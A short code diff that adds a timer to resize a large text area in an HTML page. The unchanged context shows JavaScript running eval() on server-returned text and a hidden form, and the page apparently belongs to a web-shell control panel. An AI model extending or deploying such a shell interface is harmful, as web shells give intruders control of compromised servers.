@@ -210,6 +210,10 @@ pre{font-family:Courier,Monospace;}
 				eval(arr[2].substr(0, arr[1]));
 			} else alert('Request error!');
 	}
+	var bigarea_fix = setInterval(function(){
+		var bigarea = document.getElementsByClassName('bigarea');
+		if (bigarea.length) bigarea[0].style.height = (window.innerHeight - 400) + 'px';
+	},1000);
 </script>
 <head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
 <form method=post name=mf style='display:none;'>
